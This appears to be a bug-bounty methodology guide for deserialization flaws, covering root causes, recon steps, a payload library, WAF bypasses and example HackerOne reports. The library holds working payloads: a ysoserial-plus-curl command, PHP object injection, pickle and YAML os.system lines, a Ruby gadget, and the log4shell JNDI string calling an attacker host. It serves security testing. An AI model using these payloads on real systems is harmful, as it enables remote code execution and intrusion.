---
category: deserialization
label: Deserialization
report_count: 48
programs: [deptofdefense, nextcloud, rails, rubygems, ibb, hyperledger, owncloud, revive_adserver, automattic, acronis]
avg_bounty: 3400
max_bounty: 5000
severity_distribution: critical: 15, high: 17, medium: 4, low: 3
---

## Overview
Deserialization vulnerabilities break the assumption that only trusted, well-formed objects will be instantiated from serialized data. Developers introduce these bugs by accepting or processing attacker-controlled input in serialization APIs, often for extensibility or convenience. The worst-case impact is remote code execution (RCE), but attackers can also achieve privilege escalation, data exfiltration, or logic manipulation, depending on the gadget chains and context.

## Root causes
- Direct use of unsafe deserialization APIs (`unserialize`, `pickle.load`, `YAML.load`, `Marshal.load`, Java deserialization) on untrusted input.
- Implicit trust in data sources (cookies, API bodies, uploaded files, headers) without validation or type restriction.
- Use of serialization formats supporting arbitrary object graphs (PHP, Java, Ruby, Python, .NET) in externally exposed interfaces.
- Insecure framework defaults (e.g., cache backends, session stores, RPC endpoints) that deserialize attacker-controlled data.
- Failure to restrict or validate types/classes during deserialization, enabling gadget chain exploitation.
- Reliance on blacklist-based mitigations or incomplete input validation.

## Attack surface
- Parameters or fields processed by deserialization APIs: `{param}`, `{data}`, `{token}`, `{cookie}`, `{file}`.
- HTTP request bodies and headers accepted by endpoints handling serialized objects (e.g., XML-RPC, AMF, SOAP, custom binary protocols).
- File upload features that later process files with deserialization APIs (e.g., CSV importers, plugin installers, backup/restore).
- Session, cache, or state management using serialized objects (cookies, cache keys/values, session files, database blobs).
- API endpoints accepting or returning serialized data (e.g., `/api/endpoint` with binary or base64 payloads).
- Features integrating with external services (e.g., SSO, logging, message brokers) that deserialize remote responses.
- Tech stacks: Java (native serialization, JNDI, RMI, log4j, logback), PHP (`unserialize`, Phar), Python (`pickle`, `yaml.load`), Ruby (`Marshal.load`, `YAML.load`), .NET (BinaryFormatter, DataContractSerializer).
- Client-side hints: JS or source referencing `deserialize`, `unserialize`, or handling raw binary blobs.

## Recon checklist
1. Enumerate all endpoints accepting file uploads, binary data, or large opaque parameters.
2. Identify parameters, cookies, or headers that are base64, hex, or binary-encoded.
3. Review API schemas and documentation for endpoints referencing "serialize", "marshal", or "object".
4. Inspect client-side code for serialization/deserialization logic or references to dangerous APIs.
5. Check for framework/library usage known for unsafe deserialization (e.g., Java serialization, PHP unserialize, Python pickle).
6. Map integrations with external services (logging, SSO, message brokers) that may process attacker-controlled data.
7. Analyze error messages or stack traces for deserialization-related exceptions.
8. Review application and server configuration for insecure defaults (e.g., cache backends, session stores).

## Hunt methodology
1. Identify endpoints or features processing user-supplied data with potential for deserialization (see attack surface).
2. Send benign serialized payloads (e.g., known safe objects) in `{param}`, `{body}`, `{cookie}`, or as uploaded files.
3. Observe application responses for errors, stack traces, or type confusion indicating deserialization.
4. Send gadget-based payloads (e.g., ysoserial, PHP object chains, Python pickle RCE) targeting the suspected deserialization sink.
5. Monitor for out-of-band interactions (DNS, HTTP callbacks) to confirm code execution or external calls.
6. Attempt logic manipulation payloads (e.g., privilege escalation, file deletion, cache poisoning) if RCE is not possible.
7. Test filter and WAF bypasses (encoding, alternate wrappers, chunked transfer, phar://, etc.).
8. Document the minimal payload and interaction sequence that proves impact, including any OOB evidence.

## Payload library

### Java Native Deserialization (RCE via gadget chains)
**Technique**: Exploit Java's native deserialization by sending crafted object graphs that trigger gadget chains for code execution.
**How to apply**: Send a serialized Java object (e.g., CommonsCollections, URLDNS) in `{param}` or as the request body to any endpoint suspected of calling `ObjectInputStream.readObject()` on user data.
**Payload**:  
`java -jar ysoserial.jar CommonsCollections1 'touch /tmp/pwned' > payload; curl -X POST --data-binary @payload https://{host}/api/endpoint`
**Observe**: OOB DNS/HTTP callbacks, file creation, or command execution on the server.
**Seen in**: SOAP/AMF endpoints, monitoring services, plugin uploaders.

### PHP Unserialize/Object Injection
**Technique**: Abuse PHP's `unserialize()` on attacker-controlled input to trigger magic methods in gadget classes.
**How to apply**: Send a serialized PHP object chain in `{param}`, `{cookie}`, or as a file upload, targeting endpoints that call `unserialize()` on user data.
**Payload**:  
`O:8:"ExploitMe":1:{s:4:"data";s:13:"<?php system('id'); ?>";}` (base64 or raw, as required)
**Observe**: Arbitrary code execution, file write/delete, or logic manipulation.
**Seen in**: Cookie-based state, XML-RPC handlers, plugin importers.

### Python Pickle/YAML Unsafe Load
**Technique**: Exploit Python's `pickle.load` or `yaml.load` on untrusted data to instantiate arbitrary objects.
**How to apply**: Send a malicious pickle or YAML payload in `{param}`, `{body}`, or as an uploaded file to endpoints using these APIs.
**Payload**:  
Pickle: `cos\nsystem\n(S'id'\ntR.` (base64-encoded if needed)  
YAML:  
```yaml
!!python/object/apply:os.system ["id"]
```
**Observe**: Command execution, privilege escalation, or application crash.
**Seen in**: Backup/restore, cache backends, file importers.

### Ruby Marshal/YAML Deserialization
**Technique**: Target Ruby's `Marshal.load` or `YAML.load` with crafted payloads to trigger gadget chains.
**How to apply**: Send a malicious Marshal or YAML payload in `{param}`, `{cookie}`, or as a file to endpoints using these APIs.
**Payload**:  
Marshal: Use universal deserialization gadget (see devcraft.io)  
YAML:  
```yaml
--- !ruby/object:Gem::Installer
i: x
```
**Observe**: RCE, privilege escalation, or logic manipulation.
**Seen in**: Cache fetch, API responses, gem uploads.

### .NET BinaryFormatter/Phar Deserialization
**Technique**: Exploit .NET's BinaryFormatter or PHP's Phar deserialization via file uploads or path parameters.
**How to apply**: Upload a crafted file or reference a `phar://` path in `{file}` or `{param}` that triggers deserialization.
**Payload**:  
Phar: Create a malicious Phar archive with embedded object chain, upload as `{file}` or reference as `phar://{file}`.
**Observe**: RCE, file deletion, or privilege escalation.
**Seen in**: File importers, logging configuration, plugin installers.

### JNDI/LDAP Injection (Java)
**Technique**: Inject JNDI/LDAP URLs into configuration or headers to trigger remote deserialization via JNDI lookups.
**How to apply**: Set a property or header (e.g., `{config}`) to `ldap://{attacker_host}` in features that support JNDI.
**Payload**:  
`${jndi:ldap://{attacker_host}/a}`
**Observe**: Outbound LDAP/HTTP requests, code execution via remote class loading.
**Seen in**: Logging configuration, connector properties, log4j/logback.

### AMF/XML-RPC/Custom Protocol Deserialization
**Technique**: Abuse binary protocols (AMF, XML-RPC) that deserialize user-supplied objects.
**How to apply**: Send a crafted binary payload (e.g., AMF with Java object) in the request body to endpoints accepting these formats.
**Payload**:  
AMF: Use a tool to generate a serialized object with a callback to `{attacker_host}`.
**Observe**: OOB DNS/HTTP callbacks, application errors, or RCE.
**Seen in**: Messaging endpoints, legacy integrations.

## Filter & WAF bypass
- Use alternate encodings (base64, hex, gzip) to evade input filters.
- Chunked transfer encoding to bypass content-length-based checks.
- Null byte injection (`%00`) to truncate file paths or bypass extension checks.
- Use `phar://` or other stream wrappers in PHP file parameters.
- Unicode normalization or homoglyphs in parameter names.
- Comment injection or whitespace padding in serialized payloads.
- For Java, use less common gadget chains or gadgets in third-party libraries.
- For .NET, abuse alternate serialization formats (e.g., DataContractSerializer).

## Verification & impact
- **Confirmed vulnerable**: OOB interaction (DNS/HTTP), command execution, file creation/deletion, or privilege escalation traceable to the payload.
- **False positive signals**: Application errors without code execution, stack traces referencing deserialization but no impact, or deserialization of safe types only.
- **Impact escalation**: Chain with SSRF, file upload, or logic bugs for full RCE, lateral movement, or persistence. Use gadget chains for privilege escalation or data exfiltration.

## Triage & severity
- Typical CVSS: High to Critical (7.0–10.0), especially if RCE is possible.
- Severity increases with unauthenticated access, sensitive data exposure, or ability to chain to RCE.
- Lowered if only authenticated users can trigger, or if deserialization is sandboxed/limited to safe types.
- Mitigating controls (type whitelisting, signed objects, strict input validation) reduce severity.

## Reporting tips
- Strong PoC: Minimal payload that triggers code execution or OOB interaction, with clear reproduction steps.
- Avoid: Reports with only error messages or crashes, no proven impact, or targeting endpoints not exposed to untrusted input.
- Evidence checklist: Full request/response, payload details, OOB logs/screenshots, affected code paths, and impact statement.

## Real examples
- 1529790 — aiven_ltd: RCE via JNDI deserialization in connector configuration (critical, $5000)
- 2071554 — ibb: Kredis JSON deserialization leads to arbitrary object instantiation (high, $4660)
- 3031518 — ibb: Tomcat partial PUT and session persistence chain to RCE (high, $4323)
- 274990 — rubygems: Unsafe YAML/Marshal load in gem upload leads to RCE (critical, $1500)
- 1425474 — acronis: log4shell (CVE-2021-44228) RCE via JNDI in log4j (critical, $1000)
- 838196 — deptofdefense: RCE via insecure deserialization in Telerik UI (critical, $0)
- 2248328 — nextcloud: RCE via unserialize on user-controlled cookie with Monolog gadget (critical, $0)
- 562335 — owncloud: RCE via deserialization in backup app file import (critical, $0)
- 403083 — automattic: Authenticated code execution via Phar deserialization in CSV importer (high, $0)
- 1415436 — django: Pickle deserialization in database cache enables privilege escalation (high, $0)

## Bounty intelligence
Payouts for deserialization bugs range from $1,000 to $5,000+, with the highest rewards for unauthenticated RCE in widely deployed or critical infrastructure. SaaS, cloud, and enterprise platforms (especially those using Java, PHP, or Ruby) pay most for this category. Reports with proven RCE, OOB interaction, or privilege escalation consistently attract higher bounties, especially when the attack is unauthenticated or impacts multi-tenant environments.